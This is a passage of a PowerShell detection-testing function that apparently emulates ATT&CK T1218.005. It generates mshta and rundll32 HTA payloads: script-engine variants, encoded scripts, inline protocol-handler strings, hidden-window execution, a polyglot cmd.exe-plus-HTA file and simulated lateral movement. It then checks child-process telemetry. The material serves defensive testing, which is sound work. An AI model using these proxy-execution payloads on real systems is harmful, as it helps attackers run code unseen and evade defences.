        Write-Error "mshta won't execute your HTA content when it resides in the same directory as the current working directory."
        return
    }

    if (($PSCmdlet.ParameterSetName -eq 'FileBased') -or ($PSCmdlet.ParameterSetName -eq 'DoubleClick') -or ($PSCmdlet.ParameterSetName -eq 'PolyglotFile')) {
        $ExecutionType = 'File'
        $ScriptEngineUsed = $ScriptEngine

        $ParentDir = Split-Path -Path $HTAFilePath -Parent
        $FileName = Split-Path -Path $HTAFilePath -Leaf

        if (($ParentDir -eq '') -or ($ParentDir -eq '.')) {
            $ParentDir = $PWD.Path
        }

        if (!(Test-Path -Path $ParentDir -PathType Container)) {
            Write-Error "The following directory does not exist: $ParentDir"
            return
        }

        $FullHTAPath = Join-Path -Path $ParentDir -ChildPath $FileName

        if (($PSCmdlet.ParameterSetName -eq 'DoubleClick') -and (-not $FullHTAPath.EndsWith('.hta'))) {
            Write-Error 'In order for the default HTA file handler to execute, the specified HTA file must end with an ".hta" file extension.'
            return
        }

        if ($ScriptContent) {
            $PopulatedScriptContent = $ScriptContent
        } else {
            switch ($ScriptEngine) {
                'JScript' {
                    $PopulatedScriptContent = @"
var objShell = new ActiveXObject('Wscript.Shell');
objShell.Run("$ChildProcCommand", 0, true);
window.close();
"@
                }

                'VBScript' {
                    $PopulatedScriptContent = @"
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "$ChildProcCommand", 0, true
window.close()
"@
                }

                'VBScript.Encode' {
                    $PopulatedScriptContent = ConvertTo-EncodedWSHScript -ScriptContent @"
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "$ChildProcCommand", 0, true
window.close()
"@
                }

                'JScript.Encode' {
                    $PopulatedScriptContent = ConvertTo-EncodedWSHScript -ScriptContent @"
var objShell = new ActiveXObject('Wscript.Shell');
objShell.Run("$ChildProcCommand", 0, true);
window.close();
"@
                }

                'JScript.Compact' {
                    $PopulatedScriptContent = @"
var objShell = new ActiveXObject('Wscript.Shell');
objShell.Run("$ChildProcCommand", 0, true);
window.close();
"@
                }
            }
        }

        $HTAContent = @"
<html><head><hta:application WINDOWSTATE="minimize" SHOWINTASKBAR="no"><script language = "$ScriptEngine">$PopulatedScriptContent</script></head></html>
"@

        # If -TemplatePE is specified, copy cmd.exe to the current directory, append the HTA content to it, and use it as a polyglot executor.
        if ($TemplatePE) {
            $SourcePEFilePath = "$Env:windir\System32\cmd.exe"
            $DestinationFilePath = $FullHTAPath

            Write-Verbose "Copying `"$SourcePEFilePath`" to `"$DestinationFilePath`"."

            $PEFileInfo = Copy-Item -Path $SourcePEFilePath -Destination $DestinationFilePath -PassThru -ErrorAction Stop

            [Byte[]] $PEFileBytes = [IO.File]::ReadAllBytes($PEFileInfo.FullName)
            [Byte[]] $HTAScriptBytes = [Text.Encoding]::ASCII.GetBytes($HTAContent)

            [Byte[]] $MergedFileBytes = $PEFileBytes + $HTAScriptBytes

            [IO.File]::WriteAllBytes($PEFileInfo.FullName, $MergedFileBytes)

            $HTAFullPathCopy = $PEFileInfo.FullName

            if ($AsLocalUNCPath) {
                $DriveLetter = $PEFileInfo.FullName.Split(':')[0]
                $RemainingPath = $PEFileInfo.FullName.Substring(2)

                $HTAFullPathCopy = "\\$($env:COMPUTERNAME)\$($DriveLetter)`$$($RemainingPath)"
            }

            $HTAFileHashSHA256 = Get-FileHash -Algorithm SHA256 -Path $PEFileInfo.FullName | Select-Object -ExpandProperty Hash

            $MSHTACommandLine = "`"$MSHTAFullPath`" `"$HTAFullPathCopy`""
        } else {
            # Otherwise, drop the HTA file and execute that.

            Write-Verbose "Writing HTA content to: $FullHTAPath"

            Set-Content -Path $FullHTAPath -Value $HTAContent -ErrorAction Stop

            $HTAFullPathCopy = $FullHTAPath

            if ($AsLocalUNCPath) {
                $DriveLetter = $FullHTAPath.Split(':')[0]
                $RemainingPath = $FullHTAPath.Substring(2)

                $HTAFullPathCopy = "\\$($env:COMPUTERNAME)\$($DriveLetter)`$$($RemainingPath)"
            }

            $HTAFileHashSHA256 = Get-FileHash -Algorithm SHA256 -Path $FullHTAPath | Select-Object -ExpandProperty Hash

            if ($SimulateUserDoubleClick) {
                $MSHTACommandLine = "explorer.exe `"$HTAFullPathCopy`""
            } else {
                $MSHTACommandLine = "`"$MSHTAFullPath`" `"$HTAFullPathCopy`""
            }
        }
    } elseif (($PSCmdlet.ParameterSetName -eq 'Inline') -or ($PSCmdlet.ParameterSetName -eq 'Rundll32Inline')) {
        if ($PSCmdlet.ParameterSetName -eq 'Inline') {
            $ExecutionType = 'InlineMshta'

            switch ($InlineProtocolHandler) {
                'JavaScript' {
                    if ($PSBoundParameters.ContainsKey('ScriptEngine')) { Write-Warning 'The ScriptEngine argument is only applicable to the "About" protocol handler. The specified ScriptEngine will be ignored and JScript will be used.' }

                    $ScriptEngineUsed = 'JScript'

                    $PopulatedScriptContent = @"
javascript:a=new ActiveXObject("WScript.Shell");a.Run("$ChildProcCommandHTMLEncoded",0,true);close();
"@
                }

                'VBScript' {
                    if ($PSBoundParameters.ContainsKey('ScriptEngine')) { Write-Warning 'The ScriptEngine argument is only applicable to the "About" protocol handler. The specified ScriptEngine will be ignored and VBScript will be used.' }

                    $ScriptEngineUsed = $InlineProtocolHandler

                    $PopulatedScriptContent = @"
vbscript:Close(Execute("CreateObject(""Wscript.Shell"").Run%20""$ChildProcCommandHTMLEncoded"",0,true"))'
"@
                }

                'About' {
                    $ScriptEngineUsed = $ScriptEngine

                    switch ($ScriptEngine) {
                        'JScript' {
                            $PopulatedScriptContent = @"
about:<hta:application><script language="$ScriptEngine">a=new%20ActiveXObject("WScript.Shell");a.Run("$ChildProcCommandHTMLEncoded",0,true);close();</script>'
"@
                        }

                        'VBScript' {
                            $PopulatedScriptContent = @"
about:<hta:application><script language="$ScriptEngine">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""$ChildProcCommandHTMLEncoded"",0,true"))</script>'
"@
                        }

                        'VBScript.Encode' {
                            Write-Error 'The VBScript.Encode engine is not supported with the "About" protocol handler.'

                            return
                        }

                        'JScript.Encode' {
                            Write-Error 'The JScript.Encode engine is not supported with the "About" protocol handler.'

                            return
                        }

                        'JScript.Compact' {
                            $PopulatedScriptContent = @"
about:<hta:application><script language="$ScriptEngine">a=new%20ActiveXObject("WScript.Shell");a.Run("$ChildProcCommandHTMLEncoded",0,true);close();</script>'
"@
                        }
                    }
                }
            }

            $MSHTACommandLine = "`"$MSHTAFullPath`" `"$PopulatedScriptContent`""
        } else {
            $ExecutionType = 'InlineRundll32'

            switch ($InlineProtocolHandler) {
                'JavaScript' {
                    $ScriptEngineUsed = 'JScript'

                    $PopulatedScriptContent = @"
javascript:"\..\mshtml,RunHTMLApplication ";a=new%20ActiveXObject("WScript.Shell");a.Run("$ChildProcCommandHTMLEncoded",0,true);close();
"@
                }

                'VBScript' {
                    $ScriptEngineUsed = $InlineProtocolHandler

                    $PopulatedScriptContent = @"
vbscript:"\..\mshtml,RunHTMLApplication "+String(Close(CreateObject("Wscript.Shell").Run("$ChildProcCommandHTMLEncoded",0,true)),0)
"@
                }

                'About' {
                    $ScriptEngineUsed = $ScriptEngine

                    switch ($ScriptEngine) {
                        'JScript' {
                            $PopulatedScriptContent = @"
about:"\..\mshtml,RunHTMLApplication "%3Chta:application%3E%3Cscript%20language="$ScriptEngine"%3Ea=new%20ActiveXObject("WScript.Shell");a.Run("$ChildProcCommandHTMLEncoded",0,true);close();%3C/script%3E
"@
                        }

                        'VBScript' {
                            $PopulatedScriptContent = @"
about:"\..\mshtml,RunHTMLApplication "%3Chta:application%3E%3Cscript%20language="$ScriptEngine"%3EClose(Execute("CreateObject(""Wscript.Shell"").Run%20""$ChildProcCommandHTMLEncoded"",0,true"))%3C/script%3E
"@
                        }

                        'VBScript.Encode' {
                            Write-Error 'The VBScript.Encode engine is not supported with the "About" protocol handler.'

                            return
                        }

                        'JScript.Encode' {
                            Write-Error 'The JScript.Encode engine is not supported with the "About" protocol handler.'

                            return
                        }

                        'JScript.Compact' {
                            $PopulatedScriptContent = @"
about:"\..\mshtml,RunHTMLApplication "%3Chta:application%3E%3Cscript%20language="$ScriptEngine"%3Ea=new%20ActiveXObject("WScript.Shell");a.Run("$ChildProcCommandHTMLEncoded",0,true);close();%3C/script%3E
"@
                        }
                    }
                }
            }

            $MSHTACommandLine = "`"$MSHTAFullPath`" $PopulatedScriptContent"
        }
    } elseif ($PSCmdlet.ParameterSetName -eq 'Uri') {
        $ExecutionType = 'Uri'
        $MSHTACommandLine = "`"$MSHTAFullPath`" `"$HTAUri`""
    }

    Write-Verbose "Command line to be used: $MSHTACommandLine"

    if ($ScriptContent -or $HTAUri) {
        $ProcessStartup = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly
        $ProcessStartupInstance = Get-CimInstance -InputObject $ProcessStartup
        $ProcessStartupInstance.ShowWindow = [UInt16] 0 # Hide the window
        $ProcStartResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $MSHTACommandLine; ProcessStartupInformation = $ProcessStartupInstance }

        # Validate that the process started
        if ($ProcStartResult.ReturnValue -ne 0) {
            Write-Error "The following process failed to start: $MSHTACommandLine"

            [PSCustomObject] @{
                TechniqueID = 'T1218.005'
                TestSuccess = $HTAScriptExecuted
                TestGuid = $TestGuidToUse
                ExecutionType = $ExecutionType
                ScriptEngine = $ScriptEngineUsed
                HTAFilePath = $FullHTAPath
                HTAFileHashSHA256 = $HTAFileHashSHA256
                RunnerFilePath = $MSHTAFullPath
                RunnerProcessId = $MSHTAProcessId
                RunnerCommandLine = $ProcessWMICommandLine
                RunnerChildProcessId = $SpawnedProcProcessId
                RunnerChildProcessCommandLine = $SpawnedProcCommandLine
            }

            return
        }

        $MSHTAProcessId = $ProcStartResult.ProcessId

        $ProcessWMICommandLine = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $MSHTAProcessId" -Property CommandLine | Select-Object -ExpandProperty CommandLine
    } else {
        $TestGuidToUse = $TestGuid

        # Remove any stale events
        Get-Event -SourceIdentifier 'ChildProcSpawned' -ErrorAction SilentlyContinue | Remove-Event
        Get-EventSubscriber -SourceIdentifier 'ProcessSpawned' -ErrorAction SilentlyContinue | Unregister-Event

        # Trigger an event any time powershell.exe has $TestGuid in the command line.
        # This event should correspond to the mshta or rundll process that launched it.
        $WMIEventQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe' AND TargetInstance.CommandLine LIKE '%$($TestGuid)%'"

        Write-Verbose "Registering MSHTA child process creation WMI event using the following WMI event query: $WMIEventQuery"

        $null = Register-CimIndicationEvent -SourceIdentifier 'ProcessSpawned' -Query $WMIEventQuery -Action {
            # Only signal success if the parent process is mshta or rundll32
            $ParentProcessID = $EventArgs.NewEvent.TargetInstance.ParentProcessId

            $ParentProcess = Get-CimInstance -ClassName 'Win32_Process' -Filter "ProcessId = $ParentProcessID"
            $ExecutableFileInfo = Get-Item -Path $ParentProcess.ExecutablePath
            $ParentProcessCommandLine = $ParentProcess.CommandLine
            $ParentProcessPath = $ParentProcess.Path

            $SpawnedProcInfo = [PSCustomObject] @{
                ProcessId = $EventArgs.NewEvent.TargetInstance.ProcessId
                ProcessCommandLine = $EventArgs.NewEvent.TargetInstance.CommandLine
                ParentProcessId = $ParentProcessID
                ParentProcessCommandLine = $ParentProcessCommandLine
                ParentPath = $ParentProcessPath
            }

            if (@('MSHTA.EXE', 'rundll') -contains $ExecutableFileInfo.VersionInfo.InternalName) {
                # Signal that the child proc was spawned and surface the relevant into to Wait-Event
                New-Event -SourceIdentifier 'ChildProcSpawned' -MessageData $SpawnedProcInfo
            }
        }

        if ($SimulateLateralMovement) {
            [LethalHTADotNet.LethalHTA]::Main([String[]] @('127.0.0.1', $HTAFullPathCopy))
        } else {
            $ProcessStartup = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly
            $ProcessStartupInstance = Get-CimInstance -InputObject $ProcessStartup
            $ProcessStartupInstance.ShowWindow = [UInt16] 0 # Hide the window
            $ProcStartResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $MSHTACommandLine; ProcessStartupInformation = $ProcessStartupInstance }

            # Validate that the process started
            if ($ProcStartResult.ReturnValue -ne 0) {
                Write-Error "The following process failed to start: $MSHTACommandLine"

                [PSCustomObject] @{
                    TechniqueID = 'T1218.005'
                    TestSuccess = $HTAScriptExecuted
                    TestGuid = $TestGuidToUse
                    ExecutionType = $ExecutionType
                    ScriptEngine = $ScriptEngineUsed
                    HTAFilePath = $FullHTAPath
                    HTAFileHashSHA256 = $HTAFileHashSHA256
                    RunnerFilePath = $MSHTAFullPath
                    RunnerProcessId = $MSHTAProcessId
                    RunnerCommandLine = $ProcessWMICommandLine
                    RunnerChildProcessId = $SpawnedProcProcessId
                    RunnerChildProcessCommandLine = $SpawnedProcCommandLine
                }

                return
            }
        }

        $ChildProcSpawnedEvent = Wait-Event -SourceIdentifier 'ChildProcSpawned' -Timeout 10
        $ChildProcInfo = $null

        if ($ChildProcSpawnedEvent) {
            $HTAScriptExecuted = $True

            $ChildProcInfo = $ChildProcSpawnedEvent.MessageData
            $MSHTAProcessId = $ChildProcInfo.ParentProcessId
            $ProcessWMICommandLine = $ChildProcInfo.ParentProcessCommandLine
            $SpawnedProcCommandLine = $ChildProcInfo.ProcessCommandLine
            $SpawnedProcProcessId = $ChildProcInfo.ProcessId
            $ParentProcessPath = $ChildProcInfo.ParentPath
            $ChildProcSpawnedEvent | Remove-Event
        } else {
            Write-Error "MSHTA child process was not spawned."
        }

        # Cleanup
        Unregister-Event -SourceIdentifier 'ProcessSpawned'
    }

    # Prefer the mshta/rundll path retrieved from WMI
    if (-not $ParentProcessPath) {
        $ParentProcessPath = $MSHTAFullPath
    }

    [PSCustomObject] @{
        TechniqueID = 'T1218.005'
        TestSuccess = $HTAScriptExecuted
        TestGuid = $TestGuidToUse
        ExecutionType = $ExecutionType
        ScriptEngine = $ScriptEngineUsed
        HTAFilePath = $FullHTAPath
        HTAFileHashSHA256 = $HTAFileHashSHA256
        RunnerFilePath = $ParentProcessPath
        RunnerProcessId = $MSHTAProcessId
        RunnerCommandLine = $ProcessWMICommandLine
        RunnerChildProcessId = $SpawnedProcProcessId
        RunnerChildProcessCommandLine = $SpawnedProcCommandLine
    }
}